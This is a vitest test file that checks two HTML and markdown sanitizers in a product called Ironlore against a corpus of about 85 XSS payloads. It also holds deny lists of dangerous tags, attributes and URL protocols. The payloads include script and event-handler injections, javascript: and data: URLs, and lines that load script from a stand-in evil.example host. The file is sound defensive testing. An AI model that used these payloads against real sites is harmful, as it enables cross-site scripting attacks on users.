import { Window } from "happy-dom";
import { describe, expect, it } from "vitest";
import { renderMarkdownSafe } from "./render-markdown-safe.js";
import { sanitizeHtml } from "./sanitize-html.js";

/**
 * Phase-8 XSS corpus (docs/05-jobs-and-security.md §Security test suite).
 *
 * Every rendered markdown string in Ironlore's UI flows through
 * `renderMarkdownSafe` (unified + rehype-sanitize). Third-party HTML
 * (mammoth's .docx output, etc.) flows through `sanitizeHtml` which
 * uses the browser's DOMParser. This corpus feeds both sanitizers a
 * broad set of injection vectors and asserts — by parsing the
 * rendered output through a real HTML parser — that no executable
 * surface survives.
 *
 * We don't substring-match: a payload that renders as visible text
 * containing the word "javascript:" is safe, and flagging it would
 * generate false positives. Instead, we walk the parsed DOM tree and
 * look for dangerous elements and attributes that would actually
 * execute in a browser.
 */

// Tags that execute JS or perform equivalent escapes when inserted
//  into the DOM. If any of these survive sanitization we have a hole.
const FORBIDDEN_TAG_NAMES = new Set([
  "SCRIPT",
  "IFRAME",
  "OBJECT",
  "EMBED",
  "FORM",
  "META",
  "LINK",
  "BASE",
  "STYLE",
  "SVG",
  "MATH",
  "AUDIO",
  "VIDEO",
  "SOURCE",
]);

// Attributes that would execute JS or change the DOM's trust boundary.
const FORBIDDEN_ATTR_PREFIXES = ["on"]; // onclick, onerror, onload, …
const FORBIDDEN_ATTR_NAMES = new Set([
  "srcdoc",
  "formaction",
  "style", // — we don't allow style globally; CSS can carry JS expressions.
]);
const UNSAFE_URL_PROTOCOLS = ["javascript:", "vbscript:", "livescript:", "data:text/html"];

interface Breach {
  kind: string;
  detail: string;
}

function findBreaches(rendered: string): Breach[] {
  const win = new Window();
  const doc = win.document;
  doc.body.innerHTML = rendered;

  const breaches: Breach[] = [];
  const walker = doc.createTreeWalker(doc.body, win.NodeFilter.SHOW_ELEMENT);
  let node: Element | null = walker.nextNode() as Element | null;
  while (node) {
    const tagName = node.tagName.toUpperCase();
    if (FORBIDDEN_TAG_NAMES.has(tagName)) {
      breaches.push({ kind: "forbidden-tag", detail: tagName });
    }
    for (const attr of Array.from(node.attributes)) {
      const name = attr.name.toLowerCase();
      if (FORBIDDEN_ATTR_PREFIXES.some((p) => name.startsWith(p))) {
        breaches.push({ kind: "event-handler-attr", detail: `${tagName}.${name}` });
      }
      if (FORBIDDEN_ATTR_NAMES.has(name)) {
        breaches.push({ kind: "forbidden-attr", detail: `${tagName}.${name}` });
      }
      if (name === "href" || name === "src") {
        const val = attr.value.trim().toLowerCase();
        for (const proto of UNSAFE_URL_PROTOCOLS) {
          if (val.startsWith(proto)) {
            breaches.push({
              kind: "unsafe-url",
              detail: `${tagName}.${name}=${attr.value.slice(0, 40)}`,
            });
            break;
          }
        }
      }
    }
    node = walker.nextNode() as Element | null;
  }

  win.close();
  return breaches;
}

function assertNoBreach(rendered: string, payload: string): void {
  const breaches = findBreaches(rendered);
  if (breaches.length === 0) return;
  const report = breaches.map((b) => `  · ${b.kind}: ${b.detail}`).join("\n");
  throw new Error(
    `Sanitizer leaked dangerous DOM through payload:\n  input:  ${payload}\n  output: ${rendered}\n${report}`,
  );
}

// -----------------------------------------------------------------------------
// Markdown-authored payloads (go through renderMarkdownSafe).
// -----------------------------------------------------------------------------

const MARKDOWN_XSS_CORPUS: string[] = [
  // Direct tag injection — case, whitespace, nesting variations.
  "<script>alert('xss')</script>",
  "<SCRIPT>alert(1)</SCRIPT>",
  "<ScRiPt>alert(1)</ScRiPt>",
  "<script src=//evil.example/x.js></script>",
  "<script\n>alert(1)</script>",
  "<script>/*\n*/alert(1)</script>",
  "<scr<script>ipt>alert(1)</scr</script>ipt>",

  // Image-based XSS.
  "<img src=x onerror=alert(1)>",
  "<IMG SRC=\"javascript:alert('XSS');\">",
  "<IMG SRC=javascript:alert('XSS')>",
  '<img src="x" onerror="alert`1`">',
  "<img/onerror=alert(1) src=x>",

  // SVG/MathML injectors.
  "<svg onload=alert(1)>",
  "<svg/onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  "<math><mi xlink:href='javascript:alert(1)'>X</mi></math>",

  // Iframe / srcdoc.
  "<iframe src=javascript:alert(1)></iframe>",
  "<iframe srcdoc='<script>alert(1)</script>'></iframe>",

  // Body/inline event handlers.
  "<body onload=alert(1)>",
  "<input autofocus onfocus=alert(1)>",
  "<details open ontoggle=alert(1)>",
  "<video><source onerror=alert(1)>",
  "<audio src=x onerror=alert(1)>",

  // Head-equivalent injectors.
  "<link rel=stylesheet href='javascript:alert(1)'>",
  "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
  "<base href='javascript:alert(1)//'>",
  "<object data='javascript:alert(1)'></object>",
  "<embed src='javascript:alert(1)'>",
  "<form action='/steal' method='post'><input name=x></form>",
  "<style>body{background:url(javascript:alert(1))}</style>",

  // Anchor with dangerous href — direct raw HTML.
  "<a href='javascript:alert(1)'>x</a>",
  "<a href=JaVaScRiPt:alert(1)>x</a>",
  "<a href='http://ok.example' onclick='alert(1)'>x</a>",
  "<a href=https://ok.example onmouseover=alert(1)>x</a>",

  // Markdown-link injection (javascript + data + vbscript protocols).
  "[click](javascript:alert(1))",
  "[click](JaVaScRiPt:alert(1))",
  "[click](javascript&#58;alert(1))",
  "[click](vbscript:msgbox(1))",
  "[click](data:text/html,<script>alert(1)</script>)",
  "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "[x](javascript\\x3Aalert(1))",
  "[x](javas\tcript:alert(1))",
  "[x](javas\ncript:alert(1))",
  "[x](%20javascript:alert(1))",

  // Markdown-image with dangerous src.
  "![](javascript:alert(1))",
  "![](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)",
  '![x](https://example.com/ "onerror=alert(1)")',

  // Entity-encoded evasions.
  "&lt;script&gt;alert(1)&lt;/script&gt;",
  "&#60;script&#62;alert(1)&#60;/script&#62;",
  "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",

  // HTML comment + CDATA smuggling.
  "<!--<script>alert(1)//--><script>alert(2)</script>-->",
  "<![CDATA[<script>alert(1)</script>]]>",

  // Mixed — raw HTML inside markdown structure.
  "# Heading\n\n<script>alert(1)</script>\n\n> <img src=x onerror=alert(1)>",

  // Attribute-smuggling with dangling quotes.
  '<a href="" style="background:url(javascript:alert(1))">x</a>',
  '<button formaction="javascript:alert(1)">x</button>',

  // Polyglot that tries to survive markdown escaping.
  "``</code><script>alert(1)</script>``",
  '[legit](https://example.com "</a><script>alert(1)</script>")',
];

describe("XSS corpus — renderMarkdownSafe", () => {
  for (const payload of MARKDOWN_XSS_CORPUS) {
    const label = payload.slice(0, 60).replace(/\n/g, "\\n").replace(/\t/g, "\\t");
    it(`neutralizes: ${label}`, () => {
      const html = renderMarkdownSafe(payload);
      assertNoBreach(html, payload);
    });
  }

  it(`covers at least 50 distinct payloads (current: ${MARKDOWN_XSS_CORPUS.length})`, () => {
    expect(MARKDOWN_XSS_CORPUS.length).toBeGreaterThanOrEqual(50);
  });

  it("renders benign markdown normally after the corpus (no collateral damage)", () => {
    // Guards against a future commit that locks everything down and
    //  breaks real pages.
    const html = renderMarkdownSafe("# Title\n\n[link](https://ok.example)");
    expect(html).toContain("<h1>Title</h1>");
    expect(html).toContain('href="https://ok.example"');
  });
});

// -----------------------------------------------------------------------------
// HTML-authored payloads (go through sanitizeHtml — docx / mammoth path).
//
// sanitizeHtml calls `new DOMParser()` which happy-dom provides globally
// once we stub it below. We restore the global after the suite runs so
// unrelated tests don't see a fake DOM.
// -----------------------------------------------------------------------------

const HTML_XSS_CORPUS: string[] = [
  "<p>safe<script>alert(1)</script>bar</p>",
  '<p onclick="alert(1)">x</p>',
  "<a href='javascript:alert(1)'>x</a>",
  "<a href='JAVASCRIPT:alert(1)'>x</a>",
  "<a href='vbscript:msgbox(1)'>x</a>",
  "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
  "<img src='javascript:alert(1)'>",
  "<img src='x' onerror='alert(1)'>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)></svg>",
  "<svg><circle onclick=alert(1) /></svg>",
  "<iframe src='https://evil.example'></iframe>",
  "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
  "<object data='x.swf'></object>",
  "<embed src='x.swf'>",
  "<form action='/steal' method='post'><input name=x></form>",
  "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
  "<link rel='stylesheet' href='javascript:alert(1)'>",
  "<base href='javascript:alert(1)//'>",
  "<style>body{background:url(javascript:alert(1))}</style>",
  "<div style='background:url(javascript:alert(1))'>x</div>",
  "<audio src=x onerror=alert(1)>",
  "<video src=x onerror=alert(1)>",
  "<a href='http://ok.example' onclick='alert(1)'>x</a>",
  "<p><SCRIPT >alert(1)</SCRIPT></p>",
  "<math><mi xlink:href='javascript:alert(1)'>x</mi></math>",
  "<details open ontoggle=alert(1)>",
  '<input autofocus onfocus="alert(1)">',
  "<a href='ja\tvascript:alert(1)'>x</a>",
];

describe("XSS corpus — sanitizeHtml (docx / mammoth path)", () => {
  // sanitizeHtml uses `new DOMParser()`. Give it happy-dom's DOMParser
  //  while this suite runs; restore the original (if any) afterwards.
  const originalDOMParser = (globalThis as unknown as { DOMParser?: unknown }).DOMParser;
  const setupWindow = new Window();
  (globalThis as unknown as { DOMParser: typeof setupWindow.DOMParser }).DOMParser =
    setupWindow.DOMParser;

  for (const payload of HTML_XSS_CORPUS) {
    const label = payload.slice(0, 60);
    it(`neutralizes: ${label}`, () => {
      const cleaned = sanitizeHtml(payload);
      assertNoBreach(cleaned, payload);
    });
  }

  it(`covers at least 25 distinct payloads (current: ${HTML_XSS_CORPUS.length})`, () => {
    expect(HTML_XSS_CORPUS.length).toBeGreaterThanOrEqual(25);
  });

  // Restore the environment — happy-dom's global cleanup.
  it("restores the environment (sentinel)", () => {
    if (originalDOMParser === undefined) {
      delete (globalThis as unknown as { DOMParser?: unknown }).DOMParser;
    } else {
      (globalThis as unknown as { DOMParser: unknown }).DOMParser = originalDOMParser;
    }
    setupWindow.close();
    expect(true).toBe(true);
  });
});
